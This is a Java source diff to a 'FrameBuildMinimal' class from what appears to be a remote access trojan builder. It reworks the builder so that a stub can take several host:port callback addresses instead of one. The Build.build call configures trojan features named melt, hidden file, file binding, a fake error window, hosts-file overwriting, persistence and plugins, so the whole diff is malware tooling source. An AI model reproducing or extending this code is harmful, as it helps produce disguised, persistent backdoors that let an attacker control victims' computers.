@@ -215,8 +215,7 @@ public class FrameBuildMinimal extends BaseFrame {
 			public void run() {
 				MinimalBuildListener l = new MinimalBuildListener(FrameBuildMinimal.this);
 
-				String ip = txtHost.getText().trim();
-				int port = (Integer) spPort.getValue();
+				String[] address = new String[] { txtHost.getText().trim() + ":" + spPort.getValue().toString() };
 				String id = txtId.getText().trim();
 				String pass = txtPass.getText().trim();
 				EncryptionKey key = new EncryptionKey(txtKey.getText().trim());
@@ -258,10 +257,9 @@ public class FrameBuildMinimal extends BaseFrame {
 				osconfig.addOS(OperatingSystem.OSX);
 				osconfig.addOS(OperatingSystem.LINUX);
 
-				Build.build(l, Files.getStub(), file, ip, port, id, pass, key, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, hiddenFile, bind, bindpath, bindname, droptarget, usemutex, mutexport, pluginlist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true);
-
-				Settings.getGlobal().setVal("bip", ip);
-				Settings.getGlobal().setVal("bport", port);
+				Build.build(l, Files.getStub(), file, address, id, pass, key, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, hiddenFile, bind, bindpath, bindname, droptarget, usemutex, mutexport, pluginlist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true);
+				
+				Settings.getGlobal().setVal("baddresses", address);
 				Settings.getGlobal().setVal("bid", id);
 				Settings.getGlobal().setVal("bpass", pass);
 				Settings.getGlobal().setVal("bkey", key.getTextualKey());
